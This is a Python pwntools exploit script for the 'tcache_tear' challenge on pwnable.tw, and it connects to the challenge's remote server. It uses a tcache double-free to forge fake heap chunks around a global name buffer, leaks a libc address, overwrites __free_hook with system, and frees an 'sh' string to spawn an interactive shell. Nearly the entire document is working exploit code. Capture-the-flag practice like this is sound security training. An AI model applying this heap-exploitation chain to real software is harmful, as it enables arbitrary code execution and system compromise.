from pwn import *

elf = context.binary = ELF('tcache_tear')
libc = ELF('libc.so.6')

print('free: {}'.format(hex(libc.symbols['free'])))
print('system: {}'.format(hex(libc.symbols['system'])))

#p = process()
p = remote('chall.pwnable.tw', 10207)#nc chall.pwnable.tw 10207
#gdb.attach(p)

def malloc(size, data):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Size:')
    p.sendline(str(size).encode())
    p.recvuntil(b'Data:')
    p.sendline(data)
def free():
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')



NAME = 0x602060
p.recvuntil(b'Name:')
p.sendline(b'nao')
malloc(0x60, b'A')
free()
free()
malloc(0x60, p64(NAME + 0x4f0))
malloc(0x60,b'A')
payload = flat(0, 0x21, 0, 0, 0, 0x41)
malloc(0x60, payload)



malloc(0x50, b'A')
free()
free()
malloc(0x50, p64(NAME - 0x10))
malloc(0x50, b'A')
payload = flat(0, 0x501, 0, 0, 0, 0, 0, NAME)
malloc(0x50, payload)
free()

p.recvuntil(b'Your choice :')
p.sendline(b'3')
p.recvuntil(b'Name :')
leak = p.recvuntil(b'\x00')[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: {}'.format(hex(leak)))
libc.address = leak - 4111520
print('libc: {}'.format(hex(libc.address)))

#write free hook
malloc(0x70, b'A')
free()
free()
print('free_hook: {}'.format(hex(libc.symbols['__free_hook'])))
malloc(0x70, p64(libc.symbols['__free_hook']))
malloc(0x70, b'A')
malloc(0x70, p64(libc.symbols['system']))


#trigger system
malloc(20, b'sh\x00')
free()

p.interactive()

